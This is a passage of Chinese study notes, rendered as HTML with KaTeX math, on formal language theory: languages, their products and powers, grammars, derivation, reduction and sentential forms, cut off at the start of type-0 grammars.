op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mo>=</mo><mi>u</mi><mi>y</mi><mi>v</mi><mo separator="true">,</mo><mi>w</mi><mo>=</mo><mi>x</mi><mi>y</mi><mi>z</mi></mrow><annotation encoding="application/x-tex">t=uyv, w=xyz</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>，则称y是t和w的公共子串 common substring 如果在众多子串中你是最长的，则你被称为t和w的最大公共子串</p><p>两个串的最大公共子串不一定是唯一的。</p><p>比如acccxdddb 和mcccydddn 的最大子串为 ccc 和ddd，它们的长度都为3。1</p><h3 id="语言-language"><a class="markdownIt-Anchor" href="#语言-language"></a> 语言 language</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>L</mi><mo>⊆</mo><msup><mo>∑</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\forall L\subseteq \sum^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord">∀</span><span class="mord mathdefault">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.078606em;vertical-align:-0.25001em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，称L为字母表<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo></mrow><annotation encoding="application/x-tex">\sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span></span></span></span>上的一个语言 language</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>x</mi><mo>∈</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">\forall x\in L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">L</span></span></span></span>，称x为L上的一个句子。</p><p>实际上给定一个字母表，就比如英语的a到z，包括一些其他的标点符号 它的克林闭包里面的元素实际上是无限的，然后我们在这些无数的元素中选出一些便作为了一个语言。</p><p>所以语言实际上就是一个集合。</p><p>集合里面的每一个元素都是一个句子。</p><h3 id="语言的乘积-product"><a class="markdownIt-Anchor" href="#语言的乘积-product"></a> 语言的乘积 product</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mn>1</mn></msub><mo>⊆</mo><msubsup><mo>∑</mo><mn>1</mn><mo>∗</mo></msubsup><mo separator="true">,</mo><msub><mi>L</mi><mn>2</mn></msub><mo>⊆</mo><msubsup><mo>∑</mo><mn>2</mn><mo>∗</mo></msubsup></mrow><annotation encoding="application/x-tex">L_1 \subseteq \sum_1^*, L_2 \subseteq\sum_2^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.128306em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.128306em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.828596em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span></span></span></span>，语言<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">L_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">L_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的乘积是一个语言，该语言的定义为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>L</mi><mn>1</mn></msub><msub><mi>L</mi><mn>2</mn></msub><mo>=</mo><mrow><mi>x</mi><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo>∈</mo><msub><mi>L</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><msub><mi>L</mi><mn>2</mn></msub></mrow></mrow><annotation encoding="application/x-tex">L_1L_2={xy|x\in L_1,y\in L_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span>是字母表<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo>∑</mo><mn>1</mn></msub><mo>∪</mo><msub><mo>∑</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\sum_1  \cup \sum_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139799999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∪</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139799999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span></span></span></span>上的语言。</p><p>对于语言，也有幂的概念。当了有了幂的概念，就也能定义正闭包和克林闭包啦！</p><blockquote><p>我们之前接触幂实际上是从字母表的幂开始，然后从字母表的幂定义字母表的克林闭包。然后从克林闭包中选择一些元素作为语言。</p><p>实际上幂的概念是定义在集合上的。字母表是一个字符的集合，语言是一些句子的集合。它们本质上是一样的。</p><p>所以幂、闭包这些概念都是相同的。</p></blockquote><p><img src="https://upyun.wuuconix.link/image-20211103191022449.png" alt="语言的幂" /></p><h2 id="第二章文法"><a class="markdownIt-Anchor" href="#第二章文法"></a> 第二章——文法</h2><h3 id="文法"><a class="markdownIt-Anchor" href="#文法"></a> 文法</h3><p>G=（V, T, P, S）</p><p>V 为变量 variable 的非空有穷集。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>A</mi><mo>∈</mo><mi>V</mi></mrow><annotation encoding="application/x-tex">\forall A \in V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span></span></span></span>，A叫做一个语法变量 syntactic Variable ，简称为变量，也可叫做非终极符号  nonterminal。</p><p>T 为中级符 terminal 的非空有穷集 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>a</mi><mo>∈</mo><mi>T</mi></mrow><annotation encoding="application/x-tex">\forall a\in T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span>，a叫做终极符。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mo>∩</mo><mi>T</mi><mo>=</mo><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">V \cap T = \phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">ϕ</span></span></span></span></p><p>P为产生式 production 的非空有穷集合。P中的元素均具有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha \rightarrow \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>，被称为产生式。读作α定义为β。其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>∈</mo><mo stretchy="false">(</mo><mi>V</mi><mo>∪</mo><mi>T</mi><msup><mo stretchy="false">)</mo><mo>+</mo></msup></mrow><annotation encoding="application/x-tex">\alpha \in (V \cup T)^+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.021331em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span></span></span></span>，且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span>中至少有V中元素的一个出现。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi><mo>∈</mo><mo stretchy="false">(</mo><mi>V</mi><mo>∪</mo><mi>T</mi><msup><mo stretchy="false">)</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\beta\in(V\cup T)^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></p><p>S为文法G的开始符号 start symbol</p><p>关于产生式，如果有某个变量可以定义多个元素，可以进行缩写。被定义的那些被称为候选式 candidate</p><p><img src="https://upyun.wuuconix.link/image-20211103192807185.png" alt="候选式" /></p><h3 id="推导-derivation"><a class="markdownIt-Anchor" href="#推导-derivation"></a> 推导 derivation</h3><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha \rightarrow \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span> 这是a定义b。</p><p>推导则是rightArrow</p><p><img src="https://upyun.wuuconix.link/image-20211103193315978.png" alt="推导" /></p><p>根据α能够定义β。则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>γ</mi><mi>α</mi><mi>β</mi><msub><mo>⇒</mo><mi>G</mi></msub><mi>γ</mi><mi>β</mi><mi>δ</mi></mrow><annotation encoding="application/x-tex">\gamma\alpha\beta\Rightarrow_G \gamma\beta\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">⇒</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span></span></span></span>   读作前者能够在文法G中直接推导除后者。</p><h3 id="规约-reduction"><a class="markdownIt-Anchor" href="#规约-reduction"></a> 规约 reduction</h3><p>感觉就是推导的逆？前者能够推导出后者。后者能够规约为前者。</p><p><img src="https://upyun.wuuconix.link/image-20211103193739527.png" alt="reduction" /></p><p>然后推导的那个G下标可以省略不写。</p><p>直接写为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇒</mo></mrow><annotation encoding="application/x-tex">\Rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇒</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mo>⇒</mo><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">\Rightarrow^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mrel"><span class="mrel">⇒</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span></span></span></span>b表示前者在G中经过n步推导式后者，也可以说后者经过n步规约为前者。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mo>⇒</mo><mo>+</mo></msup></mrow><annotation encoding="application/x-tex">\Rightarrow^+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.771331em;vertical-align:0em;"></span><span class="mrel"><span class="mrel">⇒</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span></span></span></span>表示前者在G中经过至少1步推导除后者，后者经过至少1步规约为前者。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mo>⇒</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\Rightarrow^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mrel"><span class="mrel">⇒</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>表前者在G中经过若干步（包括0步）推导后者，后者在G中经过若干步规约为前者。</p><p>如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mo>⇒</mo><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">\Rightarrow^0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mrel"><span class="mrel">⇒</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span>是什么情况呢？实际上就是前者等于后者了，因为前者不用推导就得到了后者，后者不用规约就得到了前者。</p><p>然后普通得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇒</mo></mrow><annotation encoding="application/x-tex">\Rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇒</span></span></span></span>不写任何东西的话，实际上省略了“1”，因为前者需要一次推导为后者，后者需要1次规约规约为前者。</p><h3 id="文法下的-语言-句子-句型的定义"><a class="markdownIt-Anchor" href="#文法下的-语言-句子-句型的定义"></a> 文法下的 语言 句子 句型的定义</h3><p><img src="https://upyun.wuuconix.link/image-20211103195443849.png" alt="文法下的不一样的定义" /></p><p>这里语言被定义为了，首先是终结符表集合的克林闭包中的一个值，并且可由开始符号推出。</p><p>句子还是一样的定义，是语言的一个元素</p><p>这里还有句型的概念，句型和句子有什么区别呢？我们可以看到句型是在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>V</mi><mo>∪</mo><mi>T</mi><msup><mo stretchy="false">)</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">(V \cup T)^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>中的一个元素，也就是说句型是可以包含变量的，而句子则没有变量，只有终结符。</p><p>但是并不说所有的句型里都有变量，没有变量也是可以的。</p><p><img src="https://upyun.wuuconix.link/image-20211103195942831.png" alt="没有变量的句型" /></p><p>这样想来，是不是可以说所有的句子是句型呢？</p><h3 id="0型文法"><a class="markdownIt-Anchor" href="#0型文法"></a> 0型文法</h3><p>ppt上没有讲怎么样的文法叫0型文法  type 0 grammar 